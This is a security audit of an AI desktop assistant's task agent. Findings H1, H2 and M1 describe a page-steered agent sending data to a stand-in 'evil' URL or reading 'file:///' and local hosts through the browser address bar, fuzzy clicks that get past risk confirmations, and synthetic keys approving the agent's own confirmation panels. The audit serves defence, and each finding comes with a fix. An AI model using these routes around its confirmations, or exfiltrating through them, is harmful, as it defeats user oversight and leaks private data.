# Rio v2.0 security and privacy audit (Opus 5.5, 2026-11-03)

Scope: feat/rio-actions, c3082f4..HEAD. Findings verified end to end by the auditor. The fixer
must fix all HIGH and MEDIUM items and the LOW batch, with regression tests.

## HIGH

**H1. The task agent reaches any URL, local hosts and `file:` through the browser address bar,
and Return there is auto-approved.**
- `RioTaskStep.swift:31-32`: `allowedBrowserCommands` includes `.newTab`, `.nextTab`, `.previousTab`.
- `RioTaskSafety.swift:57-58`: the "search box" exemption.
- `RioClickAX.swift`: walks the whole window, toolbar included.

Attack: `fillField("Address and search bar", "http://192.168.1.1/…" | "file:///…" |
"https://evil/?d=…")`, then `pressKeys(return)`. The focused label contains "search", so Return
passes as safe. Chrome's "Address and search bar", Safari's "Smart Search Field" and Firefox's
urlbar are all exposed this way. `nextTab`/`previousTab` let a page-steered agent read other tabs.

Fix:
- Refuse `fillField`/`typeText`/the Return–Space exemption unless the target has an `AXWebArea`
  ancestor (never type into browser chrome), or detect address fields explicitly (Chrome
  description "Address and search bar", Safari `AXIdentifier` `WEB_BROWSER_ADDRESS_AND_SEARCH_FIELD`,
  Firefox urlbar) and hand back to the user.
- Drop `.newTab`, `.nextTab` and `.previousTab` from the agent's set.
- Optionally abort if the page origin changes other than by the agent's own `openURL`.

**H2. The agent's risk check reads the model's label, not the element that actually gets pressed.**
- `RioTaskRunner.swift:185-186`: `target = label` from the model.
- `RioScreenActionHandler.swift:128-134`: presses whatever `RioClickMatcher` resolves (prefix,
  all-words, substring or one-typo match).

Attack: `click("Place")` resolves to "Place order", "Continue" to "Continue to payment", "Yes" to
"Yes, delete my account", and "Bay now" (a typo) to "Buy now". None of these get a confirmation.

Fix: resolve the target before deciding risk. Add a `RioTaskTargetResolving` hook in the runner
that snapshots the window and returns the matched element's texts. Run
`RioTaskSafety.isRiskyText` over all of them, and confirm whenever the match score is below exact.

## MEDIUM

**M1. Synthetic key presses can answer Rio's own confirmation panels, and action-key runs don't
block conversation commands.**
- `RioConfirmationCenter.swift:103-105`: `keyDown` accepts any Return. The task prompter uses the
  same panel class.
- `AppState.swift:4054-4063`: only conversation runs set `isRioConversationCommandRunning`.

Scenario: a confirmation is up after an action-key "text Ali…". Conversation mode resumes and
hears "Rio, press enter", which becomes `.pressKeys(return)` and lands on Rio's own key panel, so
the message is sent.

Fix:
- Ignore key events Rio itself posted. Check `cgEvent.getIntegerValueField(.eventSourceUnixProcessID) == getpid()`,
  or set a flag while `RioKeyboard`/`RioAX` post.
- Run one Rio command at a time across both sources: drop conversation commands while any
  coordinator run, confirmation or task is active.
- Ignore Return for about 300 ms after a panel appears.
- Implement the "Trust conversation mode" toggle (ON by default; owner decision). The
  coordinator needs to know a command's source first.

**M2. The task agent sends screenshots and window outlines with weaker filtering, with no
disclosure and no visible toggle.**
- `RioTaskObserver.swift:41,96,108`: skips `RioClickSafety.isSensitiveCaptureApp` and
  `isBlockedWindow`, and the outline includes text-field values.
- Gated by `RioTaskSettings.sendsScreenshots` (default ON), not by "Let Rio look at my screen".
- The task settings are not shown anywhere in SettingsView.

Fix:
- Apply the same sensitive-app and blocked-window checks in `observe()`, and send nothing in
  those cases.
- Also gate on `RioScreenSettings.isEnabled`.
- Show both task toggles in Settings with a disclosure sentence.

**M3. Conversation mode acts on "Rio" anywhere in a sentence, and sends that audio to Whisper by
default, contradicting the Info.plist promise.**
- `WakePhraseExtractor.swift:11-12`: the name is matched anywhere.
- `RioTranslatorSettings.swift:16-18`: the Arabic re-listen defaults ON.
- `RioTranslatorLayout.swift:44-48`.
- `Info.plist:44`: "Conversation mode listening never leaves your Mac".

Fix:
- Require the name at the start of a recognizer segment, or after a pause.
- Default the Whisper re-listen OFF, or reword the plist string and the Settings text (it must
  stay disclosed).
- Require confirmation for `startTranslation` when it comes from conversation mode.

**M4. Run history persists Rio's outputs to disk.**
- `AppState.swift:4163-4212`: `recordRioActionHistory` stores the transcript plus the outcome
  summary for every run. Summaries include clipboard snippets, memory recalls, read-aloud text
  (messages, pages, selection), screen descriptions, translations and task summaries.
- This breaks the in-memory clipboard promise and "forget".

Fix:
- Store a fixed per-action label only ("Read your last message", "Recalled a memory").
- Redact transcripts for memory, clipboard and reading commands, or put Rio history behind
  its own opt-in.

## LOW (fix all)
- `AppState.swift:4145`: the conversation pause ignores `RioTranslatorSpeaker` ("say it"). Add its
  `isSpeaking`.
- `RioTaskPrompt.swift:39`: the prompt still offers command with l/f/a/t. Remove l and t.
- `RioTaskRunner`: the target app isn't pinned. Abort when the frontmost PID changes from the
  task's start.
- `RioSmartSchema.swift:~185`: the smart `openURL` lacks the local and IP-literal host checks.
  Reuse `RioTaskStepParser`'s `isLocalHost`, or a shared helper.
- `RioCalendarService.swift:58-62`: attendee-less events on subscribed or imported calendars
  count as the owner's. Skip `type == .subscription` and calendars where
  `!allowsContentModifications`.
- `RioConfirmationContent.swift`: the reply confirmation should name the conversation/window title.

## Verified OK
Process calls (fixed tools and arguments), AppleScript (constant source plus descriptor
parameters), the closed sets (smart, v3 and task), CGEvent allow list, confirmation gates for send,
reply and trash, the lead's earlier fixes, no new logging, the clipboard concealed-type skip, memory
file modes, entitlements and usage strings, and the private-API struct layouts and dlsym fallbacks.
